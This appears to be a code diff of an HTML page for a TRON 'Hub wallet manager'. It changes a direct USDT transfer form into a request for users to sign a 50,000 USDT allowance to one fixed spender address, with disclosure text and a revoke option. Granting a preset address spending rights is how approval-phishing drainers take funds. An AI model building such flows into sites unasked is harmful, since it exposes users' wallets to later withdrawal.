@@ -172,37 +172,37 @@
         <article class="linked-card wallet-manager-card" id="wallet-manager-panel" hidden aria-labelledby="wallet-manager-title">
           <p class="eyebrow"><span></span> Hub wallet manager</p>
           <h3 id="wallet-manager-title">Manage connected wallet</h3>
-          <p class="lede wallet-manager-lede">Review this wallet’s balances from your wallet provider and request a USDT transfer to hub <span class="connected-address" id="manager-hub-address">TJyMvDP37nLF4fsRoa9pScmQ6qwbA1DxY9</span>. Only your wallet can sign; nothing moves without that approval.</p>
-          <p class="linked-note wallet-manager-safety"><span aria-hidden="true">✓</span> No seed phrase · No private key · No auto-approve</p>
+          <p class="lede wallet-manager-lede">Manage a limited allowance for spender <span class="connected-address" id="manager-hub-address">TJyMvDP37nLF4fsRoa9pScmQ6qwbA1DxY9</span>. Connecting does not approve tokens. Approval and revocation are separate, visible TRON transactions that require your signature.</p>
+          <p class="linked-note wallet-manager-safety"><span aria-hidden="true">✓</span> Official TRC-20 USDT · 50,000 USDT maximum · Never unlimited · No automatic transfers</p>
 
           <div class="wallet-manager-tron" id="manager-transfer-tron" hidden>
-            <form class="wallet-manager-form" id="manager-transfer-form">
-              <label for="manager-transfer-recipient">Transfer recipient (hub)</label>
-              <input id="manager-transfer-recipient" name="recipient" type="text" readonly spellcheck="false" value="TJyMvDP37nLF4fsRoa9pScmQ6qwbA1DxY9" aria-describedby="manager-transfer-recipient-hint">
-              <p class="linked-note" id="manager-transfer-recipient-hint">Official TRC-20 USDT only. Recipient is fixed to the configured hub address.</p>
-              <label for="manager-transfer-amount">USDT amount</label>
-              <input id="manager-transfer-amount" name="amount" type="text" inputmode="decimal" autocomplete="off" placeholder="0.00" required>
-              <button class="primary-action wallet-manager-submit" id="manager-review-transfer" type="submit">Review transfer request</button>
-            </form>
+            <div class="wallet-manager-form" id="manager-transfer-form">
+              <p class="linked-note"><strong>Current USDT balance:</strong> <span id="manager-usdt-balance">Refresh required</span></p>
+              <p class="linked-note"><strong>Remaining spender allowance:</strong> <span id="manager-usdt-allowance">Refresh required</span></p>
+              <button class="retry-button" id="manager-refresh-allowance" type="button">Refresh balance and allowance</button>
+              <button class="primary-action wallet-manager-submit" id="manager-review-transfer" type="button">Review 50,000 USDT approval</button>
+              <button class="retry-button" id="manager-revoke-allowance" type="button">Review revoke (set allowance to zero)</button>
+            </div>
 
             <div class="wallet-manager-review" id="manager-transfer-review" hidden>
-              <h4 class="wallet-manager-review-title">Confirm before your wallet signs</h4>
+              <h4 class="wallet-manager-review-title">Disclosure before signing</h4>
               <dl class="wallet-manager-review-list">
-                <div><dt>From</dt><dd class="connected-address" id="manager-review-sender"></dd></div>
-                <div><dt>To (hub)</dt><dd class="connected-address" id="manager-review-recipient"></dd></div>
-                <div><dt>Token</dt><dd>TRC-20 USDT</dd></div>
+                <div><dt>Owner</dt><dd class="connected-address" id="manager-review-sender"></dd></div>
+                <div><dt>Spender</dt><dd class="connected-address" id="manager-review-recipient"></dd></div>
+                <div><dt>Contract</dt><dd class="connected-address">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t (official TRC-20 USDT)</dd></div>
+                <div><dt>Action</dt><dd id="manager-review-action"></dd></div>
                 <div><dt>Amount</dt><dd id="manager-review-amount"></dd></div>
               </dl>
-              <p class="linked-note">Reject the wallet prompt if any detail differs. This page never submits without your signature.</p>
+              <p class="linked-note" id="manager-approval-disclosure">Approval lets the spender transfer up to the remaining allowance later without another owner signature. It does not transfer funds now. Reject the wallet prompt if any detail differs.</p>
               <div class="wallet-manager-actions">
-                <button class="primary-action" id="manager-sign-transfer" type="button">Approve transfer in wallet</button>
+                <button class="primary-action" id="manager-sign-transfer" type="button">Sign approval transaction</button>
                 <button class="retry-button" id="manager-cancel-transfer" type="button">Cancel</button>
               </div>
             </div>
           </div>
 
           <p class="linked-note wallet-manager-evm" id="manager-transfer-evm-note" hidden>
-            The hub address is on TRON. Connect with TronLink, Trust Wallet (TRON), or WalletConnect on TRON mainnet to request a signed USDT transfer.
+            Allowance management is available only for a connected TRON-mainnet owner wallet with a signing provider.
           </p>
 
           <p class="wallet-manager-status" id="manager-transfer-status" role="status" aria-live="polite"></p>
